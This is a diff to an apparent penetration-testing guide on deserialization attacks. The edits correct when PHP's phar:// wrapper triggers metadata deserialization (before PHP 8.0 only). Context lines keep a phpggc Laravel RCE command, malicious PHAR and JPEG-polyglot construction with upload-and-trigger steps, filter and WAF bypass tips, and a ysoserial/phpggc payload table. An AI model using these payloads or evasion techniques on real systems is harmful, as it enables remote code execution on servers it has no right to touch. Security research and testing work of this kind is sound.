@@ -141,9 +141,10 @@ version against known bypass classes: `org.apache.ibatis.datasource.jndi.JndiDat
 ---
 ## PHP Deserialization
 
-`unserialize()` instantiates objects and invokes magic methods (`__wakeup`,
-`__destruct`, `__toString`) during reconstruction. The `phar://` stream wrapper
-triggers deserialization without an explicit `unserialize()` call.
+`unserialize()` instantiates objects and can invoke `__wakeup` or `__unserialize`
+during reconstruction; gadget chains may subsequently use `__destruct` or
+`__toString`. On PHP before 8.0, loading a PHAR archive through `phar://` can
+deserialize metadata without an explicit `unserialize()` call.
 
 ### Identifying Sinks
 
@@ -151,7 +152,7 @@ triggers deserialization without an explicit `unserialize()` call.
 // Direct unserialize
 $obj = unserialize($userInput);
 
-// phar:// wrapper -- any file operation on a phar:// path is a sink
+// PHP before 8.0: file operations that load a PHAR can deserialize its metadata
 file_exists("phar://uploads/avatar.jpg");
 is_dir("phar://" . $userControlledPath);
 // Triggering functions: file_exists, is_dir, is_file, file_get_contents,
@@ -184,8 +185,15 @@ phpggc Laravel/RCE1 system 'id' -p phar -pp header.jpg -o exploit.jpg
 
 ### phar:// Exploitation
 
-The phar:// wrapper deserializes the metadata section of a PHAR archive on any file
-operation. The sink is a file function, not `unserialize()`, so it evades many audits.
+On PHP before 8.0, a file operation that loads an attacker-controlled PHAR through
+`phar://` can deserialize the archive's metadata. The application must also have
+an available gadget class for object instantiation to reach an exploitable sink.
+
+PHP 8.0 removed automatic metadata deserialization from ordinary file operations.
+On PHP 8+, look for an explicit `Phar::getMetadata()` or
+`PharFileInfo::getMetadata()` call and inspect its `allowed_classes` options.
+A file-operation sink alone is insufficient. See the
+[PHP 8.0 migration notes](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar).
 
 ```php
 // Build a malicious PHAR (php.ini: phar.readonly = 0)
@@ -202,7 +210,7 @@ $jpegHeader = file_get_contents('legitimate.jpg');
 file_put_contents('exploit.jpg', $jpegHeader . file_get_contents('exploit.phar'));
 ```
 
-Upload the polyglot as an image, then trigger a file operation referencing
+On PHP before 8.0, upload the polyglot as an image, then trigger a file operation referencing
 `phar://uploads/exploit.jpg/test.txt`.
 
 ---
@@ -537,9 +545,10 @@ Understanding defensive detection helps you craft payloads that avoid alerts.
   chains operating entirely within the allowed set.
 - .NET `SerializationBinder` -- restricts type resolution. Bypass with types within
   the allowed namespace that still enable execution.
-- PHP `allowed_classes` in `unserialize()` -- limits instantiation. Bypass by using
-  only allowed classes, or reaching the sink through phar:// where the parameter is
-  not applied.
+- PHP `allowed_classes` in `unserialize()` -- limits instantiation. Check for
+  usable gadgets within the allowed classes. On PHP before 8.0, restrictions on
+  a separate `unserialize()` call do not cover automatic PHAR metadata loading;
+  PHP 8+ metadata calls have their own deserialization options.
 - WAF rules on serialized patterns -- bypass with encoding, compression, or
   content-type switching.
 - RASP -- instruments deserialization calls. Test with URLDNS or sleep payloads
@@ -559,7 +568,7 @@ Understanding defensive detection helps you craft payloads that avoid alerts.
 | Java, Commons Collections 3.x | ysoserial | `CommonsCollections1`-`7` | URLDNS first |
 | Java, unknown classpath | ysoserial | `URLDNS` then error-based enumeration | DNS callback |
 | PHP Laravel 5.x-9.x | phpggc | `Laravel/RCE1`-`RCE10` | DNS or sleep |
-| PHP file upload + file op | phpggc | `-p phar -pp header.jpg` polyglot | phar:// trigger |
+| PHP before 8.0, file upload + file op | phpggc | `-p phar -pp header.jpg` polyglot | phar:// trigger |
 | .NET BinaryFormatter | ysoserial.net | `TypeConfuseDelegate` | Process or DNS |
 | .NET ViewState, known key | ysoserial.net | `-p ViewState` with key params | Blind exec |
 | .NET Json.NET TypeNameHandling | ysoserial.net | `ObjectDataProvider` `-f Json.Net` | File write or OOB |
